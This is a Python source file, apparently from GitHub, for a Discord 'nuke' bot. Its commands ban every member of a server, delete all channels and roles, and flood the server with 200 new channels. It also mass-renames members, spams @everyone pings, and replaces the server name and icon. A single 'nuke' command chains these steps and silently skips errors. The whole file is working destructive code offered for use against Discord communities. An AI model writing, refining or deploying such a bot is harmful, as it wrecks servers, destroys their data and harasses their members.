Author: Lemmmmm <Lemmmmm@users.noreply.github.com>

import discord
from discord.ext import commands

bot = commands.Bot(command_prefix='-sili ')

@bot.command(pass_context=True)
async def banall(ctx):
  for member in ctx.message.guild.members:
    if member.id == bot.user.id: continue

    try:
      await ctx.guild.ban(member, reason="not in real silimar mald")
      #await ctx.message.channel.send(f"Banned {member.name}!")
    except discord.errors.Forbidden:
      continue
      #await ctx.message.channel.send(f"{member.name} has a higher role than me, which won't allow me to ban them. ")

@bot.command(pass_context=True)
async def deleteChannels(ctx):
  for channel in ctx.message.guild.channels:
    try:
      await channel.delete()
    except discord.errors.Forbidden:
      continue

@bot.command(pass_context=True)
async def deleteRoles(ctx):
  for role in ctx.message.guild.roles:
    try:
      await role.delete()
    except:
      continue

@bot.command(pass_context=True)
async def spam(ctx):
  await ctx.send("how many times?")
  msg = await bot.wait_for('message', check=lambda message: message.author == ctx.author)
  for i in range(int(msg.content)):
    await ctx.message.channel.send("@everyone not in real silimar mald")

@bot.command(pass_context=True)
async def makeChannels(ctx):
  for i in range(100):
    await ctx.message.guild.create_text_channel("not in real silimar mald")
    await ctx.message.guild.create_voice_channel("not in real silimar mald ")

@bot.command(pass_context=True)
async def nickall(ctx):
  for member in ctx.message.guild.members:
    try:
      await member.edit(nick="not in real silimar mald")
    except:
      continue

@bot.command(pass_context=True)
async def rename(ctx):
  try:
    await ctx.message.guild.edit(name = "not in real silimar mald")
    with open('bruh.jpeg', 'rb') as f:
      await ctx.message.guild.edit(icon=f.read())
  except:
    return

@bot.command(pass_context=True)
async def nuke(ctx):
  await deleteChannels(ctx)
  await makeChannels(ctx)
  await nickall(ctx)
  await rename(ctx)
  await banall(ctx)



@bot.event
async def on_ready():
  print(bot.user.id)
  print("ready")
 
bot.run("YOUR_TOKEN_HERE")
